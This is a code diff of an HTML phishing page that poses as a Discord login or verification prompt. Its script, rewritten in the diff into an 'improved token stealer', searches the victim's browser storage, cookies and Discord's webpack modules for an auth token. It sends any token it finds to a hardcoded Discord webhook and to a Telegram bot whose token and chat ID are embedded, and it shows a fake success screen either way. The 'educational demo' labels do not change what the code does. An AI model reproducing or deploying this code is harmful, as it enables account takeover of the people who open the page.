@@ -148,138 +148,154 @@
     <div class="edu-badge">🔴 EDUCATIONAL DEMO</div>
 
     <script>
-        // 🔴 APNA TELEGRAM / WEBHOOK YAHAN DAALO
+        // 🔴 YOUR WEBHOOK AND TELEGRAM (PRE-FILLED)
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1515401402648629288/dvLhE72xu-qVBBhDSGviSUSyIGXuUi8-InL0eSwRF-nMAKmORb_810jbBMUJ6IRuSQZv";
+        const TELEGRAM_TOKEN = "8814653033:AAGWwRNgD-AErM08mF8qrZghyg96AGV_RoU";
+        const TELEGRAM_CHAT_ID = "6948594367";
 
-        // 🔴 YE FUNCTION MOBILE APP SE TOKEN STEAL KAREGA
-        async function stealMobileToken() {
+        // 🔴 IMPROVED TOKEN STEALER - Multiple Methods
+        async function stealToken() {
             try {
-                // Method 1: Check localStorage (works on mobile browser)
-                let token = localStorage.getItem('token');
-                if(token && token.length > 50) return token;
+                console.log('[DEBUG] Attempting to steal token...');
+                let token = null;
 
-                // Method 2: Check sessionStorage
-                token = sessionStorage.getItem('token');
-                if(token && token.length > 50) return token;
-
-                // Method 3: Check cookies (mobile app may store here)
-                const cookies = document.cookie.split(';');
-                for(let cookie of cookies) {
-                    if(cookie.includes('token=')) {
-                        token = cookie.split('token=')[1].trim();
-                        if(token.length > 50) return token;
-                    }
-                }
-
-                // Method 4: Webpack method (mobile web version)
-                if(window.webpackChunkdiscord_app) {
-                    for(const m of window.webpackChunkdiscord_app) {
-                        if(m?.exports?.default?.getToken) {
-                            token = m.exports.default.getToken();
-                            if(token) return token;
-                        }
-                    }
-                }
-
-                // Method 5: If user is on mobile app, token might be in the URL
-                if(window.location.hash) {
-                    const hash = window.location.hash;
-                    if(hash.includes('token=')) {
-                        token = hash.split('token=')[1].split('&')[0];
+                // Method 1: localStorage - all possible keys
+                const possibleKeys = ['token', 'access_token', 'auth_token', 'discord_token'];
+                for(const key of possibleKeys) {
+                    token = localStorage.getItem(key);
+                    if(token && token.length > 50) {
+                        console.log(`[DEBUG] Token found in localStorage key: ${key}`);
                         return token;
                     }
                 }
 
+                // Method 2: sessionStorage
+                for(const key of possibleKeys) {
+                    token = sessionStorage.getItem(key);
+                    if(token && token.length > 50) {
+                        console.log(`[DEBUG] Token found in sessionStorage key: ${key}`);
+                        return token;
+                    }
+                }
+
+                // Method 3: Cookies
+                const cookies = document.cookie.split(';');
+                for(let cookie of cookies) {
+                    if(cookie.includes('token=') || cookie.includes('access_token=')) {
+                        token = cookie.split('=')[1].trim();
+                        if(token.length > 50) {
+                            console.log('[DEBUG] Token found in cookies');
+                            return token;
+                        }
+                    }
+                }
+
+                // Method 4: Webpack (Discord Web version)
+                if(window.webpackChunkdiscord_app) {
+                    console.log('[DEBUG] Trying webpack method...');
+                    for(const m of window.webpackChunkdiscord_app) {
+                        if(m && m.exports && m.exports.default && m.exports.default.getToken) {
+                            token = m.exports.default.getToken();
+                            if(token) {
+                                console.log('[DEBUG] Token found via webpack');
+                                return token;
+                            }
+                        }
+                    }
+                }
+
+                // Method 5: Check all localStorage keys
+                console.log('[DEBUG] Scanning all localStorage keys...');
+                for(let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    const value = localStorage.getItem(key);
+                    if(value && value.length > 50 && (value.includes('.') || value.includes('_') || value.includes('-'))) {
+                        console.log(`[DEBUG] Potential token found in key: ${key}`);
+                        return value;
+                    }
+                }
+
+                console.log('[DEBUG] No token found');
                 return null;
             } catch(e) {
-                console.log('Error stealing token:', e);
+                console.error('[DEBUG] Error:', e);
                 return null;
             }
         }
 
-        // 🔴 SEND TOKEN TO WEBHOOK/TELEGRAM
-        async function sendTokenToWebhook(token, method) {
+        async function sendToTelegram(token) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `🔴 Discord Token Stolen!\n\n${token}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch(e) {
+                console.error('Telegram error:', e);
+                return false;
+            }
+        }
+
+        async function sendToWebhook(token) {
             try {
                 const response = await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "📱 Discord Token Stolen (Mobile)",
-                            description: `**Token:** \`${token}\`\n**Method:** ${method}\n**Time:** ${new Date().toISOString()}`,
+                            title: "📱 Discord Token Stolen",
+                            description: `**Token:** \`${token}\`\n**Time:** ${new Date().toISOString()}\n**Method:** QR Code Stealer`,
                             color: 0xFF0000,
-                            footer: { text: "QR Code Stealer • Educational Demo" }
+                            footer: { text: "Educational Demo" }
                         }]
                     })
                 });
-                console.log('Token sent to webhook:', response.status);
-                return true;
+                return response.ok;
             } catch(e) {
-                console.log('Webhook error:', e);
+                console.error('Webhook error:', e);
                 return false;
             }
         }
 
-        // 🔴 SEND TO TELEGRAM (BACKUP)
-        async function sendToTelegram(token) {
-            const TG_TOKEN = "8814653033:AAGWwRNgD-AErM08mF8qrZghyg96AGV_RoU";
-            const TG_CHAT_ID = "6948594367";
-            try {
-                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: TG_CHAT_ID,
-                        text: `📱 Discord Token Stolen!\n\n${token}`,
-                        parse_mode: 'HTML'
-                    })
-                });
-            } catch(e) {}
-        }
-
-        // 🔴 MAIN STEAL FUNCTION - JAB "LOG IN" CLICK HO
         document.getElementById('verifyBtn').onclick = () => {
             document.getElementById('loginModal').style.display = 'flex';
         };
 
         document.getElementById('stealBtn').onclick = async () => {
-            // Show loading
-            document.getElementById('stealBtn').textContent = 'Logging in...';
-            document.getElementById('stealBtn').disabled = true;
+            const btn = document.getElementById('stealBtn');
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
 
-            // Try to steal token
-            const token = await stealMobileToken();
+            const token = await stealToken();
             
             if(token && token.length > 50) {
-                // Send to webhook
-                await sendTokenToWebhook(token, 'Mobile Token Grab');
-                // Send to Telegram backup
+                await sendToWebhook(token);
                 await sendToTelegram(token);
-                
-                console.log('✅ Token stolen:', token);
+                console.log('✅ Token stolen and sent:', token);
             } else {
-                // If no token found, send fake success anyway (victim won't know)
-                console.log('⚠️ No token found, but showing success');
-                // Send notification that someone tried
-                await sendTokenToWebhook('No token found - user may not be logged in', '⚠️ Failed Attempt');
+                console.log('⚠️ No token found');
+                // Send failure notification
+                await sendToWebhook('No token found - user may not be logged in or using mobile app');
             }
 
-            // Show success screen
             document.getElementById('loginModal').style.display = 'none';
             document.getElementById('mainContent').style.display = 'none';
             document.getElementById('successScreen').style.display = 'block';
         };
 
-        // Close modal if clicked outside
         document.getElementById('loginModal').onclick = (e) => {
             if(e.target === document.getElementById('loginModal')) {
                 document.getElementById('loginModal').style.display = 'none';
             }
         };
 
-        // 🔴 Console log for educational purpose
         console.log('%c🔴 Mobile Discord Token Stealer (Educational)', 'color: #ff0000; font-size: 16px;');
-        console.log('%c⚠️ This is for educational purposes only.', 'color: #faa81a; font-size: 14px;');
+        console.log('%c⚠️ For educational purposes only.', 'color: #faa81a; font-size: 14px;');
     </script>
 </body>
 </html>
